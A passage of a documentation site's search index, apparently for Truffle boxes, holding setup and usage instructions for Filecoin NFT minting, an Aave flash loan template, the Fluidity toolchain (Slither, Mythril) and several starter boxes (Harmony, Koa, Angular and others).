Explorer can now be viewed at http://localhost:3000", "title": "Running the Filecoin Network Explorer"}, {"location": "boxes/filecoin/#deploying-the-nft-minting-contract", "text": "Deploying the contract will first require an Ethereum node to connect to. A local Ethereum node can be run using Ganache. This will supply the needed wallet and addresses for deploying the contract and owning the NFTs. To run a Ganache node, open a terminal window and run: npx ganache ethereum The following output should be displayed at the end of the log: RPC Listening on 127 .0.0.1:8545 To deploy the contract to the local node, the contract needs to be compiled and migrated. Open a terminal window at the Filecoin box and run: truffle compile followed by truffle migrate Note the address of the deployed contract, as it will be used in setting up the gallery UI .", "title": "Deploying the NFT Minting Contract"}, {"location": "boxes/filecoin/#creating-storage-deals", "text": "A storage deal is an agreement between a client and a storage miner to store some data in the network for a given duration. Note that while in the case of Filecoin's mainnet, a deal must be secured with a miner before data is stored, in Filecoin Ganache a deal is reached automatically.", "title": "Creating Storage Deals"}, {"location": "boxes/filecoin/#via-the-filecoin-network-explorer", "text": "The simplest way to store data, open the Filecoin Network Explorer and navigate to the \"Market\" tab. From here you can select a file by clicking \"Choose File\" followed by \"Upload to the Filecoin Network\".", "title": "Via the Filecoin Network Explorer"}, {"location": "boxes/filecoin/#via-truffle-preserve", "text": "Truffle now has a preserve command which allows for the 'preservation' of files directly from the Truffle CLI. This is currently experimental and thus on specific branch; installation details available at here . Once installed, you'll be able to preserve your assets via the following command. Note that you'll need to include the environments object in your truffle-config.js to point at the respective node (although these are already preconfigured in the box). truffle preserve --environment development ./assets/ --filecoin For broader help with this command run truffle help preserve .", "title": "Via Truffle Preserve"}, {"location": "boxes/filecoin/#via-curl-or-equivalent", "text": "Lastly, you can send the following curl request directly to the Lotus RPC. Note that the you'll need to update both the wallet address ( t3s3la3754... ) and Content Identifier (aka CID) ( QmZTR5bcpQ... ). curl -X POST \\ -H 'Content-Type: application/json' \\ -d '{\"jsonrpc\":\"2.0\",\"id\":0,\"method\":\"Filecoin.ClientStartDeal\",\"params\":[{\"Data\":{\"TransferType\":\"graphsync\",\"Root\":{\"/\":\"QmZTR5bcpQD7cFgTorqxZDYaew1Wqgfbd2ud9QqGPAkK2V\"},\"PieceCid\":null,\"PieceSize\":0},\"Wallet\":\"t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q\",\"Miner\":\"t01000\",\"EpochPrice\":\"2500\",\"MinBlocksDuration\":300}]}' \\ http://localhost:7777/rpc/v0", "title": "Via Curl (or equivalent)"}, {"location": "boxes/filecoin/#minting-an-nft", "text": "In the example below, we've already created a deal for the 3 assets (metadata, thumbnail, and the original asset respectively) that comprise our NFT. These are as follows, with their corresponding CIDs. metadata ( QmS4t7rFPxaaNriXvCmALr5GYRAtya5urrDaZgkfHutdCG ) thumbnail - ( QmbAAMaGWpiSgmMWYTRtGsru382j6qTVQ4FDKX2cRTRso6 ) asset - ( QmUWFZQrJHfCVNHXVjjb2zeowVvH7dC6rKpbdHsTdnAgvP ) Assuming the local Ethereum Ganache node is running, you'll be able to open a console and mint a new NFT with the following steps. As the base URL is set to that of an IPFS gateway, we'll just need to pass in the CID to the asset metadata. To create your own metadata, you can use the Filecoin Network Explorer to upload a JSON file with the following contents: { \"title\" : \"<NFT Title>\" , \"thumbnail\" : \"<CID of the desired thumbnail>\" , \"media\" : \"<CID of the desired media>\" , \"vintage\" : \"<Date of Creation>\" , \"author\" : \"<Author>\" } From there, the metadata can be minted with: truffle console truffle ( development ) > const gallery = await MyGallery.deployed () truffle ( development ) > gallery.mint ( accounts [ 0 ] , \"<CID of Metadata>\" ) In the above example the owner of the NFT is set (via accounts[0] ) to that of the first account generated by the mnemonic.", "title": "Minting an NFT"}, {"location": "boxes/filecoin/#transferring-ownership", "text": "If we want to transfer it to a new owner, we'll be able to do so with the following. truffle console truffle ( development ) > gallery.transferFrom ( accounts [ 0 ] , accounts [ 1 ] , 1 )", "title": "Transferring Ownership"}, {"location": "boxes/filecoin/#gallery-ui", "text": "A sample gallery interface is available here . To run this locally, open a terminal window at the location that the front-end gallery was installed and run: npm run start Note that this does not display the images uploaded to your local node. Out of the box, the UI pulls from a contract deployed to the Rinkeby testnet. To point to your own contract, navigate to filecoin-box/ui/src/App.js . Find the following section and follow the instructions in the comments: // TODO - comment the following two lines const provider = new ethers . providers . InfuraProvider ( \"rinkeby\" ); const myGallery = \"0x6cb457d583340099CadcBde4E05Eaa32488a6027\" ; // TODO - uncomment the following and update the contract address to that of your local migration //const provider = new ethers.providers.JsonRpcProvider(`http://localhost:8545`); //const myGallery = \"0x9aaec9900de8292b31c5eb0d49644e8456972fc8\"; Rerun the UI server to view your gallery!", "title": "Gallery UI"}, {"location": "boxes/filecoin/#support", "text": "Support for this box is available via the Truffle community available here . In addition, Filecoin support is available here .", "title": "Support"}, {"location": "boxes/flashloan-box/", "text": "Aave Flash Loan Truffle Box \u00b6 This Truffle box comes with everything you need to start developing on flash loans Installation and Setup \u00b6 Install Truffle globally, if not already installed. npm install -g truffle@latest Note: there is an issue with some older Truffle versions, e.g. v.5.1.25. This truffle box is confirmed working with the latest version (Truffle v5.1.32) Download the box. truffle unbox aave/flashloan-box Rename the env file to .env and edit the following values in the file: Sign up for Infura (or a similar provider) and replace YOUR_INFURA_KEY with an API key for your project (this is called Project ID in the Infra dashboard). Replace YOUR_ACCOUNT_KEY_FOR_DEPLOYMENT with the private key of the ethereum account you will be using to deploy the contracts. This account will become the owner of the contract. Ensure your ethereum account has some ETH to deploy the contract. In your terminal, navigate to your repo directory and install the dependencies (if not already done): npm install In the same terminal, replace NAME_OF_YOUR_NETWORK with either kovan , ropsten , or mainnet (depending on where you want to deploy the contract): truffle console --network NAME_OF_YOUR_NETWORK You are now connected to the network you chose. In the same terminal window: migrate --reset After a few minutes, your contract will be deployed on your chosen network. If you have not added any profitable logic to Flashloan.sol line 23, then you will need to fund your contract with the desired asset. See our documentation for token address and faucets. Call your contract's flashloan function within the truffle console, replacing RESERVE_ADDRESS with the reserve address found in our documentation: let f = await Flashloan.deployed() await f.flashloan(RESERVE_ADDRESS) if the above operation takes an unreasonably long time or timesout, try CTRL+C to exit the Truffle console, repeat step 5, then try this step agin. You may need to wait a few blocks before your node can 'see' the deployed contract. If you've successfully followed the above steps, then congratulations, you've just made a flash loan. For reference, here is an example transaction that followed the above steps on Ropsten using Dai . For reference, here is an example transaction that followed the above steps on Ropsten using ETH . Setup for cross protocol flash lending \u00b6 If you are working across protocols, such as using the flash loaned amount on another #DeFi protocol, sometimes it is easier to fork mainnet and use each protocol's production contracts and production ERC20 tokens. Follow the steps 0 --> step 4 from above. (Install and) Run Ganache , preferably the CLI version In truffle-config.js , ensure the details for the development network match up with your running Ganache instance. To minimise set up steps with Aave's lending pools, use Ganache's fork feature. This will 'fork' mainnet into your Ganache instance. Open terminal, replace YOUR_INFURA_KEY (this is called Project ID in the Infra dashboard) in the following and run: ganache-cli --fork https://mainnet.infura.io/v3/YOUR_INFURA_KEY -i 1 In a new terminal window in your repo directory, run: truffle console Migrate your Flashloan contract to your instance of Ganache with: migrate --reset After a few minutes, your contract will be deployed. If you have not added any profitable logic to Flashloan.sol line 23, then you will need to fund your contract with the desired asset. See our documentation for token address and faucets. Your contract is now deployed on your local Ganache, which is mirroring mainnet. Call your contract's flashloan function within the truffle console, replacing RESERVE_ADDRESS with the reserve address found in our documentation: let f = await Flashloan.deployed() await f.flashloan(RESERVE_ADDRESS) Be patient as your ganache instance works its magic. If your implementation is correct, then the transaction will succeed. If it fails/reverts, a reason will be given. Known issues \u00b6 No access to archive state errors \u00b6 If you are using Ganache to fork a network, then you may have issues with the blockchain archive state every 30 minutes. This is due to your node provider (i.e. Infura) only allowing free users access to 30 minutes of archive state. To solve this, upgrade to a paid plan, or simply restart your ganache instance and redploy your contracts. Unable to debug executeOperation() with mainnet ganache fork \u00b6 The Truffle debugger does not work too well with proxy / complex calls. You may find that the Truffle debugger returns an error such as: TypeError: Cannot read property 'version' of undefined at ... - In this case you can try calling your executeOperation() function directly, instead of having Aave's LendingPool contract invoke the function. This will allow you to debug the function directly, however you will need to supply the relevant parameters (e.g. _amount , _fee , _reserve , etc). - Alternatively, see the 'Troubleshooting' link. Troubleshooting \u00b6 See our Troubleshooting Errors documentation. Resources \u00b6 Our flash loan documentation Our Developer Discord channel", "title": "Aave Flash Loan Truffle Box"}, {"location": "boxes/flashloan-box/#aave-flash-loan-truffle-box", "text": "This Truffle box comes with everything you need to start developing on flash loans", "title": "Aave Flash Loan Truffle Box"}, {"location": "boxes/flashloan-box/#installation-and-setup", "text": "Install Truffle globally, if not already installed. npm install -g truffle@latest Note: there is an issue with some older Truffle versions, e.g. v.5.1.25. This truffle box is confirmed working with the latest version (Truffle v5.1.32) Download the box. truffle unbox aave/flashloan-box Rename the env file to .env and edit the following values in the file: Sign up for Infura (or a similar provider) and replace YOUR_INFURA_KEY with an API key for your project (this is called Project ID in the Infra dashboard). Replace YOUR_ACCOUNT_KEY_FOR_DEPLOYMENT with the private key of the ethereum account you will be using to deploy the contracts. This account will become the owner of the contract. Ensure your ethereum account has some ETH to deploy the contract. In your terminal, navigate to your repo directory and install the dependencies (if not already done): npm install In the same terminal, replace NAME_OF_YOUR_NETWORK with either kovan , ropsten , or mainnet (depending on where you want to deploy the contract): truffle console --network NAME_OF_YOUR_NETWORK You are now connected to the network you chose. In the same terminal window: migrate --reset After a few minutes, your contract will be deployed on your chosen network. If you have not added any profitable logic to Flashloan.sol line 23, then you will need to fund your contract with the desired asset. See our documentation for token address and faucets. Call your contract's flashloan function within the truffle console, replacing RESERVE_ADDRESS with the reserve address found in our documentation: let f = await Flashloan.deployed() await f.flashloan(RESERVE_ADDRESS) if the above operation takes an unreasonably long time or timesout, try CTRL+C to exit the Truffle console, repeat step 5, then try this step agin. You may need to wait a few blocks before your node can 'see' the deployed contract. If you've successfully followed the above steps, then congratulations, you've just made a flash loan. For reference, here is an example transaction that followed the above steps on Ropsten using Dai . For reference, here is an example transaction that followed the above steps on Ropsten using ETH .", "title": "Installation and Setup"}, {"location": "boxes/flashloan-box/#setup-for-cross-protocol-flash-lending", "text": "If you are working across protocols, such as using the flash loaned amount on another #DeFi protocol, sometimes it is easier to fork mainnet and use each protocol's production contracts and production ERC20 tokens. Follow the steps 0 --> step 4 from above. (Install and) Run Ganache , preferably the CLI version In truffle-config.js , ensure the details for the development network match up with your running Ganache instance. To minimise set up steps with Aave's lending pools, use Ganache's fork feature. This will 'fork' mainnet into your Ganache instance. Open terminal, replace YOUR_INFURA_KEY (this is called Project ID in the Infra dashboard) in the following and run: ganache-cli --fork https://mainnet.infura.io/v3/YOUR_INFURA_KEY -i 1 In a new terminal window in your repo directory, run: truffle console Migrate your Flashloan contract to your instance of Ganache with: migrate --reset After a few minutes, your contract will be deployed. If you have not added any profitable logic to Flashloan.sol line 23, then you will need to fund your contract with the desired asset. See our documentation for token address and faucets. Your contract is now deployed on your local Ganache, which is mirroring mainnet. Call your contract's flashloan function within the truffle console, replacing RESERVE_ADDRESS with the reserve address found in our documentation: let f = await Flashloan.deployed() await f.flashloan(RESERVE_ADDRESS) Be patient as your ganache instance works its magic. If your implementation is correct, then the transaction will succeed. If it fails/reverts, a reason will be given.", "title": "Setup for cross protocol flash lending"}, {"location": "boxes/flashloan-box/#known-issues", "text": "", "title": "Known issues"}, {"location": "boxes/flashloan-box/#no-access-to-archive-state-errors", "text": "If you are using Ganache to fork a network, then you may have issues with the blockchain archive state every 30 minutes. This is due to your node provider (i.e. Infura) only allowing free users access to 30 minutes of archive state. To solve this, upgrade to a paid plan, or simply restart your ganache instance and redploy your contracts.", "title": "No access to archive state errors"}, {"location": "boxes/flashloan-box/#unable-to-debug-executeoperation-with-mainnet-ganache-fork", "text": "The Truffle debugger does not work too well with proxy / complex calls. You may find that the Truffle debugger returns an error such as: TypeError: Cannot read property 'version' of undefined at ... - In this case you can try calling your executeOperation() function directly, instead of having Aave's LendingPool contract invoke the function. This will allow you to debug the function directly, however you will need to supply the relevant parameters (e.g. _amount , _fee , _reserve , etc). - Alternatively, see the 'Troubleshooting' link.", "title": "Unable to debug executeOperation() with mainnet ganache fork"}, {"location": "boxes/flashloan-box/#troubleshooting", "text": "See our Troubleshooting Errors documentation.", "title": "Troubleshooting"}, {"location": "boxes/flashloan-box/#resources", "text": "Our flash loan documentation Our Developer Discord channel", "title": "Resources"}, {"location": "boxes/fluidity-truffle-box/", "text": "Fluidity Truffle Box \u00b6 A truffle box providing us with a more comprehensive setup for our truffle repositories. Included: - Circle CI set up - Migration Utils - Solidity Coverage - Eth-gas-reporter - Solhint - Standard ganache - Ganache 'unlimited' (unlimited gas and contract size) - Slither - Mythril To unbox: \u00b6 Run truffle unbox airswap/fluidity-truffle-box Circle CI: \u00b6 A circle CI configuration file is provided already in the repository. This file is set up to perform: - yarn install - test migrations - run all tests and calculate their coverage - linting (this does not fix linting issues but reports them) - eth-gas-reporter report on gas usage on contract deploys and tests - clean up old branches in github Migration Utils: \u00b6 This tool integrates with truffle migrations to enable a more comprehensive tracking of deployed contracts and their addresses. Utilising migration_utils.js enables multiple deployed instances of the same contract to be tracked easily, which truffle alone does not allow. Solidity Coverage \u00b6 We use a branch of solidity-coverage written by leapdao , which enables us to use the newer versions of solidity (0.5.0+). We have found that solidity-coverage does not work with some versions of node. Our team use node v8.14.0 and v8.16.0 at this current moment in time. To run coverage locally, you must run the local coverage network using yarn ganache-coverage . In a new terminal tab then run yarn coverage which will run all truffle tests and calculate coverage. To use truffle with this local blockchain, use yarn truffle-coverage ___ filling in the command you want to use. Solhint \u00b6 Solhint is a solidity linter. .solhint.json contains our standard linting setup, which can be edited/updated. .solhintignore marks any files that the linter should ignore e.g. any files that you havent written yourself. yarn lint will execute solhint on all .sol files within the contracts folder. Standard Ganache \u00b6 Ganache can be run on your terminal using the command yarn ganache . Using truffle with this can then occur using yarn truffle ___ where you merely fill in the commands you would like to use. Ganache 'Unlimited' \u00b6 We have set up what we call 'ganache unlimited' which allows unlimited block size and unlimited contract size on ganache. To start this version of ganace run yarn ganache-unlimited and interact with it using yarn truffle-unlimited ___ Slither \u00b6 Prerequisites: for the following instructions to work, you must have: - python3 From within the root of the directory, run the following commands: ~ pip3 install virtualenv // to install virtualenv ~ virtualenv venv-slither // to setup a virtual environment in folder ./venv-slither ~ source venv-slither/bin/activate // to activate your virtual environment ~ pip3 install -r slither-requirements.txt // to install the necessary requirements for slither Your local virtual environment is now setup ready to run slither. To run slither on the contracts, how run the following: slither . Mythril-Classic \u00b6 If you do not have a Mac, please see the wiki for ubuntu or docker setup instructions Prerequisites: for the following instructions to work, you must have: - python3 - homebrew - virtualenv (installed in section above) From within the root of the directory, run the following commands: ~ brew update ~ brew upgrade ~ brew tap ethereum/ethereum ~ brew install leveldb ~ brew install solidity // now you have all the necessary dependencies from brew ~ virtualenv venv-mythril // to setup a virtual environment in folder ./venv-mythril ~ source venv-mythril/bin/activate // to activate your virtual environment ~ pip3 install -r mythril-requirements.txt // to install the necessary requirements for mythril Now to actually run mythril... \u00b6 'Mythril-Classic' depends on importing all of the relevant contract imports before analysing the code. Allowing these files to be imported actually has to be enabled,and gets more complex when allowing imports from node-modules (e.g. Open Zeppelin). For this reason it's easier to run mythril on a truffle build folder, which does all the imports for you. To set this up we therefore run: ~ rm -r build // To remove the existing build ( in case theres any old files no longer used in there ) ~ yarn truffle compile // To generate a fresh build with the latest versions Now all myth commands just need to be appended with --truffle to ensure they use the build folder. e.g. the following command will run mythril on all contracts using the build folder: ~ myth -x --truffle", "title": "Fluidity Truffle Box"}, {"location": "boxes/fluidity-truffle-box/#fluidity-truffle-box", "text": "A truffle box providing us with a more comprehensive setup for our truffle repositories. Included: - Circle CI set up - Migration Utils - Solidity Coverage - Eth-gas-reporter - Solhint - Standard ganache - Ganache 'unlimited' (unlimited gas and contract size) - Slither - Mythril", "title": "Fluidity Truffle Box"}, {"location": "boxes/fluidity-truffle-box/#to-unbox", "text": "Run truffle unbox airswap/fluidity-truffle-box", "title": "To unbox:"}, {"location": "boxes/fluidity-truffle-box/#circle-ci", "text": "A circle CI configuration file is provided already in the repository. This file is set up to perform: - yarn install - test migrations - run all tests and calculate their coverage - linting (this does not fix linting issues but reports them) - eth-gas-reporter report on gas usage on contract deploys and tests - clean up old branches in github", "title": "Circle CI:"}, {"location": "boxes/fluidity-truffle-box/#migration-utils", "text": "This tool integrates with truffle migrations to enable a more comprehensive tracking of deployed contracts and their addresses. Utilising migration_utils.js enables multiple deployed instances of the same contract to be tracked easily, which truffle alone does not allow.", "title": "Migration Utils:"}, {"location": "boxes/fluidity-truffle-box/#solidity-coverage", "text": "We use a branch of solidity-coverage written by leapdao , which enables us to use the newer versions of solidity (0.5.0+). We have found that solidity-coverage does not work with some versions of node. Our team use node v8.14.0 and v8.16.0 at this current moment in time. To run coverage locally, you must run the local coverage network using yarn ganache-coverage . In a new terminal tab then run yarn coverage which will run all truffle tests and calculate coverage. To use truffle with this local blockchain, use yarn truffle-coverage ___ filling in the command you want to use.", "title": "Solidity Coverage"}, {"location": "boxes/fluidity-truffle-box/#solhint", "text": "Solhint is a solidity linter. .solhint.json contains our standard linting setup, which can be edited/updated. .solhintignore marks any files that the linter should ignore e.g. any files that you havent written yourself. yarn lint will execute solhint on all .sol files within the contracts folder.", "title": "Solhint"}, {"location": "boxes/fluidity-truffle-box/#standard-ganache", "text": "Ganache can be run on your terminal using the command yarn ganache . Using truffle with this can then occur using yarn truffle ___ where you merely fill in the commands you would like to use.", "title": "Standard Ganache"}, {"location": "boxes/fluidity-truffle-box/#ganache-unlimited", "text": "We have set up what we call 'ganache unlimited' which allows unlimited block size and unlimited contract size on ganache. To start this version of ganace run yarn ganache-unlimited and interact with it using yarn truffle-unlimited ___", "title": "Ganache 'Unlimited'"}, {"location": "boxes/fluidity-truffle-box/#slither", "text": "Prerequisites: for the following instructions to work, you must have: - python3 From within the root of the directory, run the following commands: ~ pip3 install virtualenv // to install virtualenv ~ virtualenv venv-slither // to setup a virtual environment in folder ./venv-slither ~ source venv-slither/bin/activate // to activate your virtual environment ~ pip3 install -r slither-requirements.txt // to install the necessary requirements for slither Your local virtual environment is now setup ready to run slither. To run slither on the contracts, how run the following: slither .", "title": "Slither"}, {"location": "boxes/fluidity-truffle-box/#mythril-classic", "text": "If you do not have a Mac, please see the wiki for ubuntu or docker setup instructions Prerequisites: for the following instructions to work, you must have: - python3 - homebrew - virtualenv (installed in section above) From within the root of the directory, run the following commands: ~ brew update ~ brew upgrade ~ brew tap ethereum/ethereum ~ brew install leveldb ~ brew install solidity // now you have all the necessary dependencies from brew ~ virtualenv venv-mythril // to setup a virtual environment in folder ./venv-mythril ~ source venv-mythril/bin/activate // to activate your virtual environment ~ pip3 install -r mythril-requirements.txt // to install the necessary requirements for mythril", "title": "Mythril-Classic"}, {"location": "boxes/fluidity-truffle-box/#now-to-actually-run-mythril", "text": "'Mythril-Classic' depends on importing all of the relevant contract imports before analysing the code. Allowing these files to be imported actually has to be enabled,and gets more complex when allowing imports from node-modules (e.g. Open Zeppelin). For this reason it's easier to run mythril on a truffle build folder, which does all the imports for you. To set this up we therefore run: ~ rm -r build // To remove the existing build ( in case theres any old files no longer used in there ) ~ yarn truffle compile // To generate a fresh build with the latest versions Now all myth commands just need to be appended with --truffle to ensure they use the build folder. e.g. the following command will run mythril on all contracts using the build folder: ~ myth -x --truffle", "title": "Now to actually run mythril..."}, {"location": "boxes/harmony-box/", "text": "\u00b6 Harmony Box \u00b6 Harmony Box is a Truffle box that will get you quickly up and running deploying smart contracts on Harmony using Truffle & native Ethereum tooling. Getting started \u00b6 Truffle \u00b6 If you have Truffle installed globally: (Until the box has been approved by Truffle you have to rely on the git installation step below) mkdir harmony && cd harmony truffle unbox harmony Or if you want to install via git: git clone https://github.com/harmony-one/harmony-box.git cd harmony-box .env \u00b6 Copy .env-example to .env: cp .env-example .env Modify .env and replace \" ENTER_PRIVATE_KEY_HERE \" for each network with the respective private key you want to use when deploying contracts. Dependencies \u00b6 Install all required dependencies using yarn: yarn install The dependencies installed are the following: truffle: if you want to use a local installation rather than a global installation solc: Solidity compiler @trufflesuite/web3-provider-engine: framework for composing custom web3 providers ethereumjs-wallet: a lightweight Ethereum wallet implementation @openzeppelin/contracts: industry standard smart contract templates dotenv: .env file parsing library Compilation \u00b6 Globally installed Truffle: truffle compile Locally installed Truffle: node_modules/.bin/truffle compile Migration \u00b6 The Harmony Box comes pre-configured with three separate networks: Localnet (http://localhost:9500) Testnet (https://api.s0.b.hmny.io) Mainnet (https://api.s0.t.hmny.io) To deploy your contracts to these networks, you can run the following: Globally installed Truffle: truffle migrate --reset --skip-dry-run --network localnet truffle migrate --reset --skip-dry-run --network testnet truffle migrate --reset --skip-dry-run --network mainnet Locally installed Truffle: node_modules/.bin/truffle migrate --reset --skip-dry-run --network localnet node_modules/.bin/truffle migrate --reset --skip-dry-run --network testnet node_modules/.bin/truffle migrate --reset --skip-dry-run --network mainnet Testing \u00b6 Globally installed Truffle: truffle test Locally installed Truffle: node_modules/.bin/truffle test Attribution \u00b6 private-provider.js was originally ported from Moonbeam's Truffle Box .", "title": "Index"}, {"location": "boxes/harmony-box/#_1", "text": "", "title": ""}, {"location": "boxes/harmony-box/#harmony-box", "text": "Harmony Box is a Truffle box that will get you quickly up and running deploying smart contracts on Harmony using Truffle & native Ethereum tooling.", "title": "Harmony Box"}, {"location": "boxes/harmony-box/#getting-started", "text": "", "title": "Getting started"}, {"location": "boxes/harmony-box/#truffle", "text": "If you have Truffle installed globally: (Until the box has been approved by Truffle you have to rely on the git installation step below) mkdir harmony && cd harmony truffle unbox harmony Or if you want to install via git: git clone https://github.com/harmony-one/harmony-box.git cd harmony-box", "title": "Truffle"}, {"location": "boxes/harmony-box/#env", "text": "Copy .env-example to .env: cp .env-example .env Modify .env and replace \" ENTER_PRIVATE_KEY_HERE \" for each network with the respective private key you want to use when deploying contracts.", "title": ".env"}, {"location": "boxes/harmony-box/#dependencies", "text": "Install all required dependencies using yarn: yarn install The dependencies installed are the following: truffle: if you want to use a local installation rather than a global installation solc: Solidity compiler @trufflesuite/web3-provider-engine: framework for composing custom web3 providers ethereumjs-wallet: a lightweight Ethereum wallet implementation @openzeppelin/contracts: industry standard smart contract templates dotenv: .env file parsing library", "title": "Dependencies"}, {"location": "boxes/harmony-box/#compilation", "text": "Globally installed Truffle: truffle compile Locally installed Truffle: node_modules/.bin/truffle compile", "title": "Compilation"}, {"location": "boxes/harmony-box/#migration", "text": "The Harmony Box comes pre-configured with three separate networks: Localnet (http://localhost:9500) Testnet (https://api.s0.b.hmny.io) Mainnet (https://api.s0.t.hmny.io) To deploy your contracts to these networks, you can run the following: Globally installed Truffle: truffle migrate --reset --skip-dry-run --network localnet truffle migrate --reset --skip-dry-run --network testnet truffle migrate --reset --skip-dry-run --network mainnet Locally installed Truffle: node_modules/.bin/truffle migrate --reset --skip-dry-run --network localnet node_modules/.bin/truffle migrate --reset --skip-dry-run --network testnet node_modules/.bin/truffle migrate --reset --skip-dry-run --network mainnet", "title": "Migration"}, {"location": "boxes/harmony-box/#testing", "text": "Globally installed Truffle: truffle test Locally installed Truffle: node_modules/.bin/truffle test", "title": "Testing"}, {"location": "boxes/harmony-box/#attribution", "text": "private-provider.js was originally ported from Moonbeam's Truffle Box .", "title": "Attribution"}, {"location": "boxes/helloworldbox/", "text": "HelloWorldBox \u00b6 Download Box \u00b6 truffle unbox yehia67/helloworldbox Installation \u00b6 Install dependencies npm install OS X & Linux: truffle develop compile migrate Open Another Terminal npm run dev To deploy on ropsten deploy --network ropsten-infura For More Details \u00b6 check this tutorial https://medium.com/@yehiatarek67/getting-started-with-dapp-developments-af7088422629", "title": "HelloWorldBox"}, {"location": "boxes/helloworldbox/#helloworldbox", "text": "", "title": "HelloWorldBox"}, {"location": "boxes/helloworldbox/#download-box", "text": "truffle unbox yehia67/helloworldbox", "title": "Download Box"}, {"location": "boxes/helloworldbox/#installation", "text": "Install dependencies npm install OS X & Linux: truffle develop compile migrate Open Another Terminal npm run dev To deploy on ropsten deploy --network ropsten-infura", "title": "Installation"}, {"location": "boxes/helloworldbox/#for-more-details", "text": "check this tutorial https://medium.com/@yehiatarek67/getting-started-with-dapp-developments-af7088422629", "title": "For More Details"}, {"location": "boxes/koa-trufflebox/", "text": "Koa-Box \u00b6 A truffle box to serve as the foundation of any Truffle and Koa.js dApp. This Box Uses NodeJS(Koa JS) to provide API endpoints to the Ethereum Blockchain smart contract so that this smart contract can be used in Android/Ios Apps as well. Production grade lightweight JSON based logging utility configurable env's based on current NODE_ENV Error handling middlewares Easily pluggable controllers and routers The project structure is highly modular and can be directly used or extended for production purpose Pre-Requisites 1. NodeJS 2. Yarn Or NPM 3. GanacheCLI 4. Truffle Installation 1. Install Truffle and Ganache CLI globally. npm install -g truffle npm install -g ganache-cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox manjeet-thadani/koa-trufflebox Install all the node modules required by running: // install all the node modules using npm npm install or if you prefer yarn //install all the node modules using yarn yarn install Start truffle development console using truffle develop Inside the truffle console run compile to compile the contracts You can see that a new /build folder has been created in the root directory which contains the compiled contracts. Now these contracts need to be deployed on the Blockchain. For this, run migrate inside the truffle development console To run the Koa server yarn start or npm start In the browser window open http://localhost:8081/ . Collaborators 1. MANJEET THADANI 2. CHIRAG MALIWAL", "title": "Koa-Box"}, {"location": "boxes/koa-trufflebox/#koa-box", "text": "A truffle box to serve as the foundation of any Truffle and Koa.js dApp. This Box Uses NodeJS(Koa JS) to provide API endpoints to the Ethereum Blockchain smart contract so that this smart contract can be used in Android/Ios Apps as well. Production grade lightweight JSON based logging utility configurable env's based on current NODE_ENV Error handling middlewares Easily pluggable controllers and routers The project structure is highly modular and can be directly used or extended for production purpose Pre-Requisites 1. NodeJS 2. Yarn Or NPM 3. GanacheCLI 4. Truffle Installation 1. Install Truffle and Ganache CLI globally. npm install -g truffle npm install -g ganache-cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox manjeet-thadani/koa-trufflebox Install all the node modules required by running: // install all the node modules using npm npm install or if you prefer yarn //install all the node modules using yarn yarn install Start truffle development console using truffle develop Inside the truffle console run compile to compile the contracts You can see that a new /build folder has been created in the root directory which contains the compiled contracts. Now these contracts need to be deployed on the Blockchain. For this, run migrate inside the truffle development console To run the Koa server yarn start or npm start In the browser window open http://localhost:8081/ . Collaborators 1. MANJEET THADANI 2. CHIRAG MALIWAL", "title": "Koa-Box"}, {"location": "boxes/limelabs-angular-box/", "text": "This is a fork from Quintor: I've added: - SCSS instead of CSS - Upgraded the typescript as I love async/await - Added bootstrap 3 - Added Axios Everything below is the same as in Quintors Box Truffle Box for Angular \u00b6 This Truffle Box provides a base for working with the Truffle Framework and Angular. It provides a basic working example of the MetaCoin contracts with Angular components. This project is generated with Angular CLI . Building \u00b6 Install truffle, Angular CLI and an Ethereum client. If you don't have a test environment, we recommend Ethereum TestRPC npm install -g truffle npm install -g @angular/cli npm install -g ethereumjs-testrpc Download the box. truffle unbox LimelabsTech/angular-truffle-box Run your Ethereum client. For TestRPC: testrpc Note the mnemonic 12-word phrase printed on startup, you will need it later. Compile and migrate your contracts. truffle compile && truffle migrate Running \u00b6 Run the app using Angular CLI: ng serve The app is now served on localhost:4200 Connect to it by opening it in your browser and configuring MetaMask with the 12-word phrase from TestRPC. Send MetaCoins! Testing \u00b6 Running the Angular component tests: ng test Running the Truffle tests: truffle test Running Protactor end-to-end tests ng e2e Releasing \u00b6 Using the Angular CLI you can build a distributable of your app. Will be placed in dist/ ng build FAQ \u00b6 Where can I find more documentation? This Truffle box is a union of Truffle and an Angular setup created with Angular CLI . For solidity compilation and Ethereum related issues, try the Truffle documentation . For Angular CLI and typescript issues, refer to the Angular CLI documentation", "title": "Index"}, {"location": "boxes/limelabs-angular-box/#truffle-box-for-angular", "text": "This Truffle Box provides a base for working with the Truffle Framework and Angular. It provides a basic working example of the MetaCoin contracts with Angular components. This project is generated with Angular CLI .", "title": "Truffle Box for Angular"}, {"location": "boxes/limelabs-angular-box/#building", "text": "Install truffle, Angular CLI and an Ethereum client. If you don't have a test environment, we recommend Ethereum TestRPC npm install -g truffle npm install -g @angular/cli npm install -g ethereumjs-testrpc Download the box. truffle unbox LimelabsTech/angular-truffle-box Run your Ethereum client. For TestRPC: testrpc Note the mnemonic 12-word phrase printed on startup, you will need it later. Compile and migrate your contracts. truffle compile && truffle migrate", "title": "Building"}, {"location": "boxes/limelabs-angular-box/#running", "text": "Run the app using Angular CLI: ng serve The app is now served on localhost:4200 Connect to it by opening it in your browser and configuring MetaMask with the 12-word phrase from TestRPC. Send MetaCoins!", "title": "Running"}, {"location": "boxes/limelabs-angular-box/#testing", "text": "Running the Angular component tests: ng test Running the Truffle tests: truffle test Running Protactor end-to-end tests ng e2e", "title": "Testing"}, {"location": "boxes/limelabs-angular-box/#releasing", "text": "Using the Angular CLI you can build a distributable of your app. Will be placed in dist/ ng build", "title": "Releasing"}, {"location": "boxes/limelabs-angular-box/#faq", "text": "Where can I find more documentation? This Truffle box is a union of Truffle and an Angular setup created with Angular CLI . For solidity compilation and Ethereum related issues, try the Truffle documentation . For Angular CLI and typescript issues, refer to the Angular CLI documentation", "title": "FAQ"}, {"location": "boxes/macroverse-truffle-box/", "text": "Macroverse Truffle Box \u00b6 This box comes with everything a developer needs to use Macroverse in an Ethereum dapp or game. What is Macroverse \u00b6 Macroverse is a procedurally generated universe, available to be used by blockchain-based games. Rather than paying expensive gas costs to store environment and level data on the blockchain, or spending large amounts of developer effort on custom world generation algorithms, game developers can use Macroverse as a piece of game development middleware, and can find settings for their games by exploring the single, shared Macroverse universe. Macroverse provides trusted, proven world generation algorithms, and a shared universe accessible to all developers, allowing even 